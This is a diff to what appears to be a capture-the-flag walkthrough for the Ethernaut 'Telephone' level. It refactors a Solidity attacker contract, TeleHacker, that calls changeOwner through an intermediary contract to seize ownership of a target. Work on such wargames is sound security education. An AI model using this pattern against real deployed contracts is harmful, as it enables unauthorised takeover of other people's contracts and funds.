@@ -39,14 +39,14 @@ pragma solidity ^0.4.18;
 contract Telephone {
   function changeOwner(address _owner) public;
 }
-contract Telhack {
+contract TeleHacker {    
  
-    Telephone target = Telephone(/*Your Zepplin Main Contract Address*/);
- 
-    function hack(){
+    function hack(address param) public{ /*param Is Your Zepplin Main Contract Address*/
+      Telephone target = Telephone(param);
         target.changeOwner(msg.sender);
     }
 }
+
 ```
 ![](https://i.imgur.com/0MpTuEj.png)
 
